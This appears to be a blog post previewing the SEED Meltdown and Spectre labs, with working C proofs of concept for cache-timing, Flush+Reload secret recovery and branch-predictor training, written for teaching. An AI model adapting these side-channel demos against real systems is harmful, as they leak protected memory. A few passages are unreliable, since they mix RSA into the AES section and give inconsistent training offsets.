---
layout:             post
title:              "SEED Labs 2.0: Meltdown and Spectre Attack Labs Preview"
category:           "Computing Systems"
tags:               hardware-security microarchitecture cache
permalink:          /side-channels-seedlab/
last_modified_at:   "2022-11-07"
---

This is a preview of SEED Meltdown and Spectre Attack Labs.

In 2017, it was discovered that many modern processors, including those from Intel and ARM, are vulnerable to attacks called **Meltdown**{: style="color: red"} and **Spectre**{: style="color: red"}. Meltdown allows a user-level program to read data stored inside the kernel memory, leading to data leakage. Spectre exploits a race condition vulnerability in the design of the speculative execution implemented in most CPUs, which allows a malicious program to read the data from the area that is not accessible to it. Unlike the Meltdown attack, the restricted area does not need to be inside the kernel; it can be in the same process space as the malicious program, making defending the Spectre attack much more difficult.

<!-- excerpt-end -->

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## An Introduction to Cache Attacks

Assume that a **set-associative memory cache**{: style="color: red"} on modern processors is organized into $S$ *cache sets*, each of which contains $W$ *cache lines*. In common terminology, $W$ is called the *associativity* and the corresponding cache is called $W$-*way associative*. A cache line is a storage cell consisting of, let's say, $B$ bytes. Thus, a cache has $S \cdot W \cdot B$ bytes in size.

"Higher-level" caches, which are closer to the processor core, are smaller but faster than "lower-level" caches, which are closer to main memory. The last-level cache (LLC) is a *unified* cache (storing both data and instruction), typically shared among all cores of a multicore chip. An important feature of the LLC in modern Intel processors is its *inclusivity*, i.e. the LLC contains copies of all of the data stored in the higher cache levels. The $\log_{2}B$ lowest-order bits of the memory address (the *line offset*) are used to locate a datum in the cache line. The $\log_{2}S$ consecutive bits starting from bit $\log_{2}B$ of the memory address (the *set index*) is used to locate a cache set when the cache is accessed. The remaining high-order bits are used as a *tag* for each cache line. After locating the cache set, the tag field of the address is matched against the tag of the $W$ lines in the set to identify if one of the cache lines is a cache hit.

[The 2005 paper by Colin Percival](https://www.daemonology.net/papers/htt.pdf) investigated the cryptographic side-channel created by cache memory sharing (on the 2.8 GHz Intel Pentium 4 processor)[^1].

```assembly
    mov         ecx, start_of_buffer
    sub         length_of_buffer, 0x2000    ; Spy's 8192-byte buffer
    rdtsc
    mov         esi, eax
    xor         edi, edi                    ; %edi <- 0
loop:
    prefetcht2  [ecx + edi + 0x2800]        ; buffer[64i + 10240]
    add         cx, [ecx + edi + 0x0000]    ; %cx <- buffer[64i]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x0800]    ; %cx <- buffer[64i + 2048]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x1000]    ; %cx <- buffer[64i + 4096]
    imul        ecx, 1
    add         cx, [ecx + edi + 0x1800]    ; %cx <- buffer[64i + 6144]
    imul        ecx, 1

    rdtsc
    sub         eax, esi
    mov         [ecx + edi], ax
    add         esi, eax
    imul        ecx, 1

    add         edi, 0x40                   ; %edi <- %edi + 64
    test        edi, 0x7c0                  ; Jump to loop if %edi not
    jnz         loop                        ; equal to 1984 = 31 * 64

    sub         edi, 0x7fe                  ; %edi <- %edi - 2046
    test        edi, 0x3e                   ; Jump to loop if %edi not
    jnz         loop                        ; equal to 62

    add         edi, 0x7c0                  ; %edi <- %edi + 1984
    sub         length_of_buffer, 0x800     ; Trojan's 2048-byte buffer
    jge         loop
```

The above code illustrates how a Spy process can monitor the L1 data cache ($128$ cache lines of $64$ bytes each, organized into $32$ four-way associative sets): it repeatedly measures the amount of time needed to read bytes <code>64i</code>, <code>64i + 2048</code>, <code>64i + 4096</code>, and <code>64i + 6144</code> of a $8192$-byte array for <code>i = 0..31</code>. A Trojan process accesses byte <code>64i</code> of an $2048$-byte array if and only if bit <code>i</code> of a $32$-bit word is set. One memory access by the Trojan process causes four cache misses by the Spy.

### Comparing Data Access Time of CPU Cache with Main Memory

In the following code (<code>CacheTime.c</code>), we have an array of size <code>10 * 4096</code> initialized to ones. Since a typical cache block size is 64 bytes, no two elemnets used in the program fall into the same cache block.

```c
/* CacheTime.c */
#include <x86intrin.h>
#include <stdio.h>

#define N 10

uint8_t array[N * 4096];

int main(int argc, const char **argv)
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    for (i = 0; i < N; i++) {
        array[i * 4096] = 1;
    }

    for (i = 0; i < N; i++) {
        _mm_clflush(&array[i * 4096]);
    }

    array[3 * 4096] = 100;
    array[7 * 4096] = 200;

    for (i = 0; i < N; i++) {
        addr = &array[i * 4096];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        printf("Access time for array[%d * 4096]: %5u CPU cycles.\n", i, (unsigned int)time2);
    }

    return 0;
}
```

[<code>x86intrin.h</code>](https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/host/x86_64-linux-glibc2.7-4.6/+/refs/heads/jb-dev/lib/gcc/x86_64-linux/4.6.x-google/include/x86intrin.h) is the main header file for all x86 intrinsics functions.

The prototypes for [Intel Streaming SIMD Extensions 2 (Intel SSE2) intrinsics](https://www.intel.com/content/www/us/en/docs/intrinsics-guide/) for cacheability support are in the <code>emmintrin.h</code> header file, where the function <code>_mm_clflush()</code> is defined as:
```c
#include <emmintrin.h>

/* Cache line containing p is flushed and invalidated
 * from all caches in the coherency domain. */
void _mm_clflush (void const* p);
```
The data size affected is the cache coherency size, which is enumerated by the CPUID instruction (typically 64 bytes).

The function <code>__rdtscp()</code> is defined as:
```c
#include <immintrin.h>

/* dst[63:0] := TimeStampCounter
 * MEM[mem_addr+31:mem_addr] := IA32_TSC_AUX[32:0] */
unsigned __int64 __rdtscp (unsigned int * mem_addr);
```

Compile <code>CacheTime.c</code> using the following command:
```bash
gcc -march=native CacheTime.c -o CacheTime
```

On my Mac PC (1.6 GHz Dual-Core Intel Core i5 with macOS Monterey 12.6.1 installed):
```console
$ sysctl -a | grep machdep
...
machdep.cpu.cache.linesize: 64
machdep.cpu.cache.L2_associativity: 8
machdep.cpu.cache.size: 256
...
machdep.cpu.brand_string: Intel(R) Core(TM) i5-5250U CPU @ 1.60GHz
$ sysctl -a | grep cache
...
hw.l1icachesize: 32768
hw.l1dcachesize: 32768
hw.l2cachesize: 262144
hw.l3cachesize: 3145728
...
```
running the program produces the following results:
```console
$ ./CacheTime
Access time for array[0 * 4096]:   134 CPU cycles.
Access time for array[1 * 4096]:   134 CPU cycles.
Access time for array[2 * 4096]:   182 CPU cycles.
Access time for array[3 * 4096]:    50 CPU cycles.
Access time for array[4 * 4096]:   138 CPU cycles.
Access time for array[5 * 4096]:   150 CPU cycles.
Access time for array[6 * 4096]:   140 CPU cycles.
Access time for array[7 * 4096]:    68 CPU cycles.
Access time for array[8 * 4096]:   142 CPU cycles.
Access time for array[9 * 4096]:   142 CPU cycles.
```

We can see that the accesses of <code>array[3 * 4096]</code> and <code>array[7 * 4096]</code> are consistenty faster than the accesses of other elements because these two elements are already in the cache while the others are not.

### Attacks on AES: Exploiting Memory Access Patterns

[RSA](https://cs.ru.nl/~joan/papers/JDA_VRI_Rijndael_2002.pdf) is a public-key cryptosystem which supports both encryption and digital signatures. To generate an RSA key pair $(N, e)$, the user randomly generates two prime numbers $p$, $q$, and computes $N = pq$. Next, given a public exponnet $e$ (e.g. $65537$ used by GnuPG and OpenSSL), the user computes the secret exponent

$$d \equiv e^{-1} \pmod{(p - 1)(q - 1)}.$$

The private key is the triple $(p, q, d)$. In textbook RSA encryption, a message $m$ is encrypted by computing $m^{e} \pmod{N}$ and a ciphertext $c$ is decrypted by computing $c^{d} \pmod{N}$. RSA decryption is often implemented using the Chinese remainder theorem (CRT), which splits the secret key $d$ into two parts:

$$d_{p} = d \pmod{(p - 1)},$$

and

$$d_{q} = d \pmod{(q - 1)},$$

and then computes two parts of the message as $m_{p} = c^{d_{p}} \pmod{p}$ and $m_{q} = c^{d_{q}} \pmod{q}$. Then the message $m$ is calculated by

$$h = (m_{p} - m_{q})(q^{-1} \pmod{p}) \pmod{p},$$

and

$$m = m_{q} + hq.$$

AES software relies heavily upon **S-box lookups**, which are table lookups using input-dependent indices; i.e., loads from input-dependent addresses in memory. As an example, Barreto's 2003 implementation scrambles a $16$-byte input $n$ using a $16$-byte key $k$, a constant $256$-byte table $S = (99, 124, 119, 123, 242, ...)$, and another constant $256$-byte table $S' = (198, 248, 238, 246, 255, ...)$. These two $256$-byte tables are expanded into four $1024$-byte ($256$ times $4$-byte words) tables $T_{0}, T_{1}, T_{2}, T_{3}$:

$$
\begin{align}
T_{0}[b] &= (S'[b], S[b], S[b], S[b] \oplus S'[b]) \\
T_{1}[b] &= (S[b] \oplus S'[b], S'[b], S[b], S[b]) \\
T_{2}[b] &= (S[b], S[b] \oplus S'[b], S'[b], S[b]) \\
T_{3}[b] &= (S[b], S[b], S[b] \oplus S'[b], S'[b]).    
\end{align}
$$

where $\oplus$ means exclusive-or. What is the consequence? Consider calculating $T_{0}[k[0] \oplus n[0]]$ near the beginning of the AES computation. It is reasonable to speculate that the time for this lookup depends on the array index and the AES timing might leak information about $k[0] \oplus n[0]$. How to exploit this? A simple idea is to watch the time taken by a victim program, total the AES times for each possible $n[13]$, and track the value of $n[13]$ when the overall AES time reaches maximum (e.g. $n[13] = 147$). If we already know that when $k[13] \oplus n[13] = 8$ the overall AES time reaches maximum, we can directly compute $k[13] = 147 \oplus 8 = 155$[^2].

A timing method called **Evict+Time** assumes that we know the memory address of each (lookup) table $T_{\ell}$ (denoted as $V(T_{\ell})$) and the cache sets of all tables are distinct, and proceeds as follows:
- Trigger an encryption of plaintext $\mathbf{p}$;
- Access some $W$ (cache associativity) memory addresses, at least $B$ (cache line size) bytes apart, that are all congruent to $V(T_{\ell}) + y \cdot B / \delta \pmod{S \cdot B}$ (where $y$ is the table index and $\delta$ is $B$ divided by the size of each table entry);
- Trigger a second encryption of $\mathbf{p}$ and time it as the measurement score.

This method is not sound if we are extracting AES keys from "heavy-weight" services because triggering the encryption (e.g., through a kernel system call) typically executes additional code and the timing can be influenced by instruction scheduling, conditional branches, page table misses, etc.

Another timing method called **Prime+Probe** tries to discover the set of memory blocks read by the encryption *a posteriori*, by examining the state of the cache after encryption. Assume the tables $T_{0}, T_{1}, T_{2}. T_{3}$ are contiguous. The attacker will first allocate a contiguous byte array $A[0, \dots , S \cdot W \cdot B - 1]$ starting from a known address congruent modulo $S \cdot B$ to the start address of $T_{0}$. Then, the method proceeds as follows:
- Read a value from every memory block in $A$;
- Trigger an encryption of $\mathbf{p}$;
- For every table $\ell = 0, \dots , 3$, and index $y = 0, \delta, 2\delta, \dots , 256 - \delta$, read memory addresses $A[1024\ell + 4y + tSB]$ for $t = 0, \dots , W - 1$ and time these $W$ memory accesses.

Each encryption effectively yields $4 \cdot 256 / \delta$ samples of measure score[^3]. With page sharing between the Spy process and the Trojan process, the Spy can make sure that a specific memory line is evicted from the whole cache hierarchy.

The **Flush+Reload** method proposed by [Yarom and Falkner (2014)](https://www.usenix.org/node/184416)[^4] targets the LLC with the Spy process being independent of memory accesses of the Trojan process. The method first allocates an <code>array</code> with $256 \times 4096$ elements (no two elements <code>array[i * 4096]</code> and <code>array[j * 4096]</code> will be in the same cache block) and proceeds as follows:
- Flush the array to make sure none of the $256$ elements (<code>array[k * 4096 + DELTA]</code> for <code>k = 0..255</code>) is cached;
- Access the array element at position $S$ where $S$ is a one-byte secret value we happen to know;
- Access $256$ elements of the array. The access time for the element at position $S$ should be faster than that for the other elements.

```c
/* FlushReload.c */
#include <x86intrin.h>
#include <stdio.h>

uint8_t array[256 * 4096];
char secret = 94;                   /* Secret value */
int temp;                           /* Stores the value of the array element at the secret position */

#define CACHE_HIT_THRESHOLD (80)    /* May vary based on CPU and memory speed */
#define DELTA 1024

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void getSecret()
{
    temp = array[secret * 4096 + DELTA];
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

int main(int argc, const char **argv)
{
    flushSideChannel();
    getSecret();
    reloadSideChannel();
    return 0;
}
```

Compile the program and run it multiple times:
```console
$ gcc -march=native FlushReload.c -o FlushReload
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
$ ./FlushReload
array[94 * 4096 + 1024] is in cache!
The secret is 94.
```
Note that in the second program run, no secret value was identified. This is the noisy nature of side channels.

### Out-of-Order Execution and Branch Prediction by Modern CPUs

Reusing some code from the previous section, let us conduct an experiment in which our <code>victim()</code> function only accesses the array element at the secret position if some <code>x</code> is less than $10$. To take advantage of CPU's speculative execution feature, we train the CPU to expect the <code>if</code> condition to come out to be true.
```c
/* An experiment to observe the effect caused by an out-of-order execution */
#include <x86intrin.h>
#include <stdio.h>

int size = 10;
uint8_t array[256 * 4096];
uint8_t temp = 0;

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void victim(size_t x)
{
    if (x < size) {
        temp = array[x * 4096 + DELTA];
    }
}

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

int main()
{
    int i;
    /* The training procedure */
    for (i = 0; i < 10; i++) {
        _mm_clflush(&size);
        victim(i);
    }

    /* Flush the probing array */
    flushSideChannel();

    /* Access the secret */
    _mm_clflush(&size);
    victim(97);

    /* Reload the probing array */
    reloadSideChannel();

    return 0;
}
```

Compile the program and run it multiple times:
```console
$ gcc -march=native specexec.c -o specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
```
We can see that although $97 > 10$, the secret element appears in the cache, which is due to the out-of-order execution and the branch prediction at the microarchitectural level. However, if we call <code>victim(i + 11)</code> rather than <code>victim(i)</code> (so that <code>i + 20</code> always greater than <code>size</code> for <code>i = 0..9</code>) during the training procedure, the output becomes:
```console
$ gcc -march=native specexec.c -o specexec
$ ./specexec
$ ./specexec
array[97 * 4096 + 1024] is in cache!
The secret is 97.
$ ./specexec
$ ./specexec
$ ./specexec
$ ./specexec
$ ./specexec
```

## The Spectre Attack

## References

[^1]: Colin Percival, "Cache Missing for Fun and Profit," In *BSDCan 2005*, Ottawa, CA, 2005.

[^2]: Daniel J. Bernstein, "Cache-Timing Attacks on AES," [https://cr.yp.to/antiforgery/cachetiming-20050414.pdf](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf), April 2005.

[^3]: [Eran Tromer](http://www.cs.tau.ac.il/~tromer/cache/), Dag Arne Osvik, and Adi Shamir, "Efficient Cache Attacks on AES, and Countermeasures," *Journal of Cryptology*, Vol. 23, No. 1, 37-71, Springer, 2010.

[^4]: Yuval Yarom and Katrina Falkner, "$\textsc{Flush+Reload}$: A High Resolution, Low Noise, L3 Cache Side-Channel Attack," In *Proceedings of the 23rd USENIX Security Symposium*, August 20-22, 2014, San Diego, CA.